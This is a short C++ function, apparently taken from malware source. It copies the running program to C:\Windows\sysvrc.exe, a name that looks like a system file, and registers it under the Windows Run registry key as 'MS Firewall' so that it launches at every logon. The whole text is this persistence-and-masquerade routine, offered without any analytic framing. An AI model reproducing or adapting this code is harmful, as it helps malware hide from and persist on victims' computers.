bool install(){//istall into temp+random filename + pseudorand regname(Microsoft Windows %OS% 
	char Filename[_MAX_PATH +1];
    string install_location;

    install_location="C:\\Windows\\sysvrc.exe";
	GetModuleFileName(NULL, Filename, _MAX_PATH);
	MoveFile(Filename, install_location.c_str());
	HKEY hkey; 
	RegCreateKeyEx(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 

0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, 0);    
	RegSetValueEx(hkey, "MS Firewall",0, REG_SZ,
		(unsigned char*)install_location.c_str(), install_location.length()); 
	RegCloseKey(hkey);
	return 0;
}
